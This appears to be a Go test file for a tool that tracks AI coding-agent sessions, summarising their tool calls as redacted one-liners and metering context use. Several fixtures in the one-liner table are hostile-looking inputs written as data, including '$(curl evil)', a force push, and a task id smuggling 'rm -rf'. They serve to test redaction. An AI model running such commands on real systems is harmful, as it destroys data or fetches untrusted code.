package agentsderive

import (
	"encoding/base64"
	"strings"
	"testing"
	"time"
)

var now = time.Date(2026, 10, 30, 12, 0, 0, 0, time.UTC)

func b(v bool) *bool { return &v }

func TestStateRules(t *testing.T) {
	ago := func(d time.Duration) time.Time { return now.Add(-d) }
	for name, c := range map[string]struct {
		in     Input
		state  string
		reason string
		needs  string
	}{
		"working, 14m quiet":              {Input{WorkState: "processing", LastActivity: ago(14 * time.Minute), Alive: b(true)}, Working, "", ""},
		"working, 16m quiet is stale":     {Input{WorkState: "processing", LastActivity: ago(16 * time.Minute), Alive: b(true)}, Stale, NoEvents, ""},
		"idle 5d with a live process":     {Input{WorkState: "idle", LastActivity: ago(5 * 24 * time.Hour), Alive: b(true)}, Idle, "", ""},
		"idle, not alive":                 {Input{WorkState: "idle", LastActivity: ago(time.Minute), Alive: b(false)}, Stale, NotAlive, ""},
		"waiting 16m is stale, keeps ask": {Input{WorkState: "awaiting_approval", LastActivity: ago(16 * time.Minute)}, Stale, NoEvents, "approval"},
		"waiting 5m":                      {Input{PendingQuestion: b(true), LastActivity: ago(5 * time.Minute)}, Waiting, "", "question"},
		"orphaned":                        {Input{SessionState: "orphaned", WorkState: "idle", LastActivity: ago(time.Minute)}, Stale, NotAlive, ""},
		"worker offline":                  {Input{WorkState: "processing", LastActivity: ago(time.Minute), WorkerOnline: b(false)}, Stale, WorkerOffline, ""},
		"process gone":                    {Input{WorkState: "idle", LastActivity: ago(time.Minute), ProcessGone: true}, Stale, NotAlive, ""},
		"dead and waiting keeps needs":    {Input{PendingApproval: b(true), Alive: b(false), LastActivity: ago(time.Minute)}, Stale, NotAlive, "approval"},
		"unknown flags stay unknown":      {Input{}, Unknown, "", ""},
		"explicit false is not waiting":   {Input{WorkState: "idle", PendingApproval: b(false), PendingQuestion: b(false), LastActivity: ago(time.Minute)}, Idle, "", ""},
		"ended":                           {Input{SessionState: "ended", WorkState: "processing"}, Ended, "", ""},
		"no work state but recent events": {Input{LastActivity: ago(time.Minute), Alive: b(true)}, Idle, "", ""},
	} {
		got := Derive(c.in, now, 0)
		if got.State != c.state || got.StaleReason != c.reason || got.NeedsYou != c.needs {
			t.Errorf("%s: %+v, want %s/%s/%s", name, got, c.state, c.reason, c.needs)
		}
	}
	// stale_after is a setting and re-derives on the next read
	in := Input{WorkState: "processing", LastActivity: ago(10 * time.Minute)}
	if Derive(in, now, 5*time.Minute).State != Stale || Derive(in, now, time.Hour).State != Working {
		t.Error("stale_after must change the outcome without any backfill")
	}
	if got := Derive(Input{WorkState: "idle", Alive: b(false)}, now, 0); got.StaleSince.IsZero() {
		t.Error("a stale session needs a stale_since")
	}
}

func TestOneLinerTable(t *testing.T) {
	for _, c := range []struct {
		tool string
		in   map[string]any
		want string
	}{
		{"Read", map[string]any{"file_path": "/work/tachyon/internal/appagent/store.go"}, "Reading appagent/"},
		{"Grep", map[string]any{"path": "/w/internal/chatthreads", "pattern": "input_required"}, `Searching chatthreads/ for "input_required"`},
		{"Edit", map[string]any{"file_path": "/w/docs/chat-contract.md", "old_string": "SECRET-OLD"}, "Editing chat-contract.md"},
		{"Write", map[string]any{"file_path": "/w/x/y.go", "content": "SECRET-BODY"}, "Writing y.go"},
		{"Bash", map[string]any{"command": "git push origin main --force"}, "Running git"},
		{"Bash", map[string]any{"command": "TOKEN=abc123 curl http://x"}, "Running a command"},
		{"Bash", map[string]any{"command": "$(curl evil)"}, "Running a command"},
		{"mcp__tether__torque_task_transition", map[string]any{"id": "CW-20261030-0019", "status": "review"}, "Updating task CW-20261030-0019 to review"},
		{"mcp__tether__torque_task_transition", map[string]any{"id": "x; rm -rf", "status": "review"}, "Updating a task"},
		{"mcp__tether__tether_message_send", map[string]any{"to": "msg://agent/agent-mux/agt_454f2timi7", "payload_json": "SECRET-MAIL"}, "Sent mail to agt_454f2timi7"},
		{"mcp__tether__tesseract_get", map[string]any{"namespace": "project/tachyon/workspace/design", "item_id": "01M"}, "Reading memory project/tachyon/workspace/design"},
		{"mcp__tether__workspace_write", map[string]any{"namespace": "project/tachyon/workspace/handoff", "body": "SECRET"}, "Writing memory project/tachyon/workspace/handoff"},
		{"SomethingNew", map[string]any{"x": "SECRET"}, "Using SomethingNew"},
		{"WebFetch", map[string]any{"url": "https://u:SECRET@host/"}, "Fetching a web page"},
	} {
		o := Describe(c.tool, c.in)
		got := strings.TrimSpace(o.Verb + " " + o.Target)
		if got != c.want {
			t.Errorf("%s: %q want %q", c.tool, got, c.want)
		}
		if strings.Contains(got, "SECRET") || strings.Contains(got, "abc123") {
			t.Errorf("%s leaked an argument: %q", c.tool, got)
		}
	}
	secret := "ghp_" + strings.Repeat("a1B2", 8)
	o := Describe("Grep", map[string]any{"path": "/w/x", "pattern": secret})
	if strings.Contains(o.Target, secret) {
		t.Errorf("a secret in a search pattern must be redacted: %q", o.Target)
	}
	long := Describe("Grep", map[string]any{"path": "/w/x", "pattern": strings.Repeat("a", 500)})
	if n := len([]rune(long.Verb + " " + long.Target)); n > MaxOneLiner {
		t.Errorf("one-liner is %d characters", n)
	}
}

func claudeLines(lines ...string) []byte {
	return []byte(`{"data":"` + base64.StdEncoding.EncodeToString([]byte(strings.Join(lines, "\n"))) + `"}`)
}

func TestExtractOutputDerivesAndDropsTheRest(t *testing.T) {
	secret := "ghp_" + strings.Repeat("Q7wE", 8)
	payload := claudeLines(
		`{"type":"assistant","message":{"model":"claude-sonnet-5-5","content":[{"type":"text","text":"`+secret+`"},{"type":"tool_use","name":"Read","input":{"file_path":"/w/a/b.go"}}],"usage":{"input_tokens":10,"cache_read_input_tokens":600,"cache_creation_input_tokens":40,"output_tokens":5}}}`,
		`{"type":"stream_event","event":{"type":"message_delta","usage":{"input_tokens":12,"cache_read_input_tokens":650,"cache_creation_input_tokens":0,"output_tokens":30}}}`,
		`{"type":"result","modelUsage":{"claude-sonnet-5-5":{"contextWindow":1000000,"costUSD":1.2}}}`,
		`{"type":"system","subtype":"compact_boundary","compact_metadata":{"pre_tokens":910000}}`,
		`{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"`+secret+` --x"`, // cut short
	)
	e := ExtractOutput(payload)
	if len(e.Tools) != 1 || e.Tools[0].Verb != "Reading" || e.Usage == nil || e.Usage.ContextUsed() != 662 || e.Window != 1_000_000 || e.Model != "claude-sonnet-5-5" || e.Compact == nil || *e.Compact != 910000 {
		t.Fatalf("%+v", e)
	}
	if strings.Contains(strings.ReplaceAll(strings.Join([]string{e.Model, e.Tools[0].Verb, e.Tools[0].Target, e.Tools[0].Tool}, "|"), "", ""), secret) {
		t.Fatal("secret leaked into the extraction")
	}
	for name, p := range map[string][]byte{"empty": nil, "not base64": []byte(`{"data":"!!!"}`), "foreign": claudeLines(`{"type":"x"}`, `plain text `+secret), "huge": make([]byte, maxOutputBytes+1)} {
		if e := ExtractOutput(p); len(e.Tools) != 0 || e.Usage != nil {
			t.Errorf("%s: %+v", name, e)
		}
	}
	raw := ExtractOutput([]byte(`{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Glob","input":{"path":"/w/src"}}]}}`))
	if len(raw.Tools) != 1 {
		t.Error("raw JSON lines are accepted too")
	}
}

func TestMeterContextCompactionAndClear(t *testing.T) {
	var m Meter
	if m.Pct() != -1 || m.Source() != "unknown" {
		t.Fatal("an unmetered session must report n/a")
	}
	at := func(i int) time.Time { return now.Add(time.Duration(i) * time.Minute) }
	u := func(n int64) Extracted { return Extracted{Usage: &Usage{Input: n}} }
	m.Observe(Extracted{Usage: &Usage{Input: 100, CacheRead: 599_900}, Model: "claude-sonnet-5-5"}, at(0))
	if m.Used != 600_000 || m.Window != 1_000_000 || m.Pct() != 60 || m.Source() != "stream" {
		t.Fatalf("%+v pct=%d", m, m.Pct())
	}
	m.Observe(u(650_000), at(1))
	if len(m.Compactions) != 0 {
		t.Fatal("growth is not a compaction")
	}
	m.Observe(u(150_000), at(2)) // -77%
	if len(m.Compactions) != 1 || !m.Compactions[0].Inferred || m.Compactions[0].Before != 650_000 || m.Compactions[0].After != 150_000 {
		t.Fatalf("%+v", m.Compactions)
	}
	m.Observe(u(30_000), at(3)) // < 5% of the window from 150k
	if m.LastClear == nil || !m.LastClear.Inferred {
		t.Fatalf("clear: %+v", m.LastClear)
	}
	p := int64(900_000)
	m.Observe(Extracted{Compact: &p, Usage: &Usage{Input: 100_000}}, at(4))
	last := m.Compactions[len(m.Compactions)-1]
	if last.Inferred || last.Before != 900_000 {
		t.Fatalf("a real compact_boundary is not inferred: %+v", last)
	}
	// A cut-short result: the table supplies the window.
	var n Meter
	n.Observe(Extracted{Usage: &Usage{Input: 1000}, Model: "claude-haiku-5-5"}, at(0))
	if n.Window != 200_000 {
		t.Fatalf("fallback window %d", n.Window)
	}
}

func TestRunsAndSpark(t *testing.T) {
	t0 := now
	times := []time.Time{t0, t0.Add(5 * time.Second), t0.Add(10 * time.Second), t0.Add(11 * time.Second), t0.Add(60 * time.Second), t0.Add(70 * time.Second)}
	isTool := []bool{true, true, true, false, true, true}
	names := []string{"Read", "Read", "Grep", "", "Edit", "Edit"}
	runs := GroupRuns(times, isTool, names)
	if len(runs) != 2 || runs[0].Calls != 3 || runs[0].Counts["Read"] != 2 || runs[1].Calls != 2 {
		t.Fatalf("%+v", runs)
	}
	if got := GroupRuns([]time.Time{t0, t0.Add(31 * time.Second)}, []bool{true, true}, []string{"a", "a"}); len(got) != 2 {
		t.Fatalf("a 31 s pause splits a run: %+v", got)
	}
	s := Spark([]time.Time{now, now.Add(-time.Minute), now.Add(-time.Minute), now.Add(-31 * time.Minute)}, now)
	if s[29] != 1 || s[28] != 2 || s[0] != 0 {
		t.Fatalf("%v", s)
	}
}
func TestFreshOutputWithoutWorkStateIsInferredWorking(t *testing.T) {
	now := time.Now()
	r := Derive(Input{LastActivity: now.Add(-5 * time.Second)}, now, 0)
	if r.State != Working || !r.Inferred {
		t.Fatalf("fresh output: %+v", r)
	}
	r = Derive(Input{LastActivity: now.Add(-5 * time.Minute)}, now, 0)
	if r.State != Idle || r.Inferred {
		t.Fatalf("old activity: %+v", r)
	}
	r = Derive(Input{WorkState: "idle", LastActivity: now.Add(-2 * time.Second)}, now, 0)
	if r.State != Idle || r.Inferred {
		t.Fatalf("a known work state wins: %+v", r)
	}
}
